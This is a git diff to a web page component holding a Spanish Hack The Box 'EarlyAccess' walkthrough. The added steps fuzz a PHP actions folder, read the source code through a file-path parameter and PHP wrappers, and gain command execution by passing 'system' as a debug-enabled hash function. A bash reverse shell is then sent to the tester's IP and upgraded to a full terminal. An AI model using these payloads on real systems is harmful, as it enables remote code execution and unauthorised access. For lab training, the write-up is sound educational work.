@@ -658,10 +658,8 @@ export function EarlyAccess() {
         `}
       />
       <Paragraph>
-        !SAS¡ Obtenemos la contraseña <i>gameover</i> para el correo <i>admin@earlyaccess</i>,
-        iniciamos session en <i>https://dev.earlyaccess.htb/index.php</i>
+        !SAS¡ Iniciamos session en <i>https://dev.earlyaccess.htb/index.php</i> con las contraseña <i>gameover</i>.
       </Paragraph>
-      
     </ContentBlock>
     <ContentBlock>
       <SubTitle>
@@ -674,29 +672,190 @@ export function EarlyAccess() {
         height={1374}
       />
       <Paragraph>
-      En la herramienta de hashear vemos que la peticion la hace a <i>/actions/hash.php</i>.
+        Vemos una herramienta de hasheo, cual texto ingresado lo 
+        convierte en <i>MD5</i> o <i>SHA1</i>..
       </Paragraph>
-      <Highlighter 
+      <Image
+        src='/early_admin_HASH.webp'
+        layout="responsive"
+        width={435}
+        height={307}
+      />
+      <Paragraph>
+        al ver con mas cuidado y utilizando <i>Burpsuite</i> hace una peticio a <i>/actions/hash.php</i>.
+      </Paragraph>
+      <Highlighter
         text={`
-        action=hash&redirect=true&password=leonardo1234&hash_function=md5
+          action=hash&redirect=true&password=leonardo1234&hash_function=md5
         `}
       />
       <Paragraph>
-        Podemos pensar que existen mas archivos <i>.php</i> en el directorio <i>/actions</i> asi que vamos
-        a aplicar un <i>fuzzing</i> a esa ruta y descubrir nuevos archivos.
+        La respuesta es una redireccion 302 a <i>/home.php?tool=hashing</i> y nos retorna con el hash.
+      </Paragraph>
+      <Paragraph>
+        A este punto pensamos que existen mas archivos <i>.php</i> en el directorio <i>/actions</i> asi que vamos
+        a aplicar un <i>fuzzing</i> a esta ruta.
       </Paragraph>
       <Highlighter
         text={`
           wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID-54n248979024dq084fckdn90" "http://dev.earlyaccess.htb/actions/FUZZ.php"
         `}
       />
-      <Image
-        src='/admin_login.webp'
-        layout="responsive"
-        width={840}
-        height={1374}
+      <Highlighter 
+        text={`
+        ********************************************************
+        * Wfuzz 3.1.0 - The Web Fuzzer                         *
+        ********************************************************
+        
+        Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ=asd
+        Total requests: 2588
+        
+        =====================================================================
+        ID           Response   Lines    Word       Chars       Payload                              
+        =====================================================================
+        
+        000001316:   500        0 L      10 W       89 Ch       "filepath"                           
+        
+        Total time: 48.76479
+        Processed Requests: 2588
+        Filtered Requests: 2587
+        Requests/sec.: 53.07106
+        
+        `}
       />
-      
+      <Paragraph>
+        Tenemos un parametro!, Al apuntar a <i>asd</i> nos retorna <i>invalid path</i> pero por ejemplo
+        al cambiar a un archi que sabemos que existe por ejemplo <i>file.php</i> nos retorna un codigo de estado
+        exitoso.
+      </Paragraph>
+      <Image
+        src='/early_filepath.webp'
+        layout="responsive"
+        width={687}
+        height={235}
+      />
+      <Paragraph>
+        Aplicaremos <a src='https://www.php.net/manual/es/wrappers.php.php' noreferer={true}>wrappers</a>, y convertiremos el texto en <i>base64</i> para luego 
+        leerlo.
+      </Paragraph>
+      <Image
+        src='/early_wrapper.webp'
+        layout="responsive"
+        width={902}
+        height={47}
+      />
+      <Highlighter
+        text={`
+          echo base64.txt | base64 -d > hash.php
+        `}
+      />
+    </ContentBlock>
+    <ContentBlock>
+      <SubTitle>
+        hash.php | source code
+      </SubTitle>
+      <Paragraph>
+        Al final del archivo vemos una funcion <i>hash_pw</i> la cual llama la atencion
+        en <i>php</i> si la funcion tiene una @ antes el <i>string</i> recibido lo trata como
+        si fuera una funcion.
+      </Paragraph>
+      <Highlighter
+        text={`
+          function hash_pw($hash_function, $password)
+          {
+            // DEVELOPER-NOTE: There has gotta be an easier way...
+            ob_start();
+            // Use inputted hash_function to hash password
+            $hash = @$hash_function($password);
+              ob_end_clean();
+              return $hash;
+           }
+        `}
+      />
+      <Paragraph>
+        Notamos que hay una variable llamada debug, y dice que permite hashes personalizados,
+        el desarrollador debio dejar esto a proposito para temas de debug...
+      </Paragraph>
+      <Highlighter 
+        text={`
+          if(isset($_REQUEST['action']))
+          {
+              if($_REQUEST['action'] === "verify")
+              {                                      
+                  // VERIFIES $password AGAINST $hash
+    
+                  if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
+                  {                                                 
+                      // Only allow custom hashes, if debug is set
+                      if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
+                          throw new Exception("Only MD5 and SHA1 are currently supported!");
+    
+                      $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
+                                                                          
+                      $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
+                      header('Location: /home.php?tool=hashing');
+                      return;
+                  }
+              }
+        `}
+      />
+      <Paragraph>
+        Tal vez si encontramos una forma de manipular esta data con <i>Burpsuite</i> podremos ganar 
+        acceso al sistema.
+      </Paragraph>
+      <Highlighter
+        text={`
+          action=hash&redirect=true&password=id&hash_function=system&debug=asd
+        `}
+      />
+       <Image
+        src='/early_hash_pwn.webp'
+        layout="responsive"
+        width={481}
+        height={93}
+      />
+      <Paragraph>
+        Solo queda darnos una reverse shell.
+      </Paragraph>
+      <Highlighter
+        text={`
+          action=hash&password=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&hash_function=system&debug=1
+        `}
+      />
+      <Paragraph>
+        ponemos en <i>url encode</i> para evitarnos errores y escuchamos en nuestro local con netcat.
+      </Paragraph>
+      <Highlighter
+        text={`
+          leo@nardo$ nc -lnvp 443
+          listening on [any] 443 ...
+          connect to [10.10.14.6] from (UNKNOWN) [10.10.11.110] 49100
+          bash: cannot set terminal process group (1): Inappropriate ioctl for device
+          bash: no job control in this shell
+          www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ id
+          uid=33(www-data) gid=33(www-data) groups=33(www-data)
+          www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ hostname -I
+          hostname -I
+          172.18.0.102
+        `}
+      />
+      <Paragraph>
+        Vemos que estamos en un contenedor ya que nuestro target es <i>10.10.11.110</i>, 
+        ahora que tenemos acceso poder hacer un tratamiento de la consola con <i>script</i>.
+      </Paragraph>
+      <Highlighter
+        text={`
+        www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ script /dev/null -c bash
+        <rlyaccess.htb/dev/actions$ script /dev/null -c bash
+        Script started, file is /dev/null
+        www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
+        zsh: suspended nc -nlvp 443
+        oxdf@hacky$ stty raw -echo ; fg
+        nc -lnvp 443
+                    reset xterm
+        www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ 
+        `}
+      />
     </ContentBlock>
   </>
 }
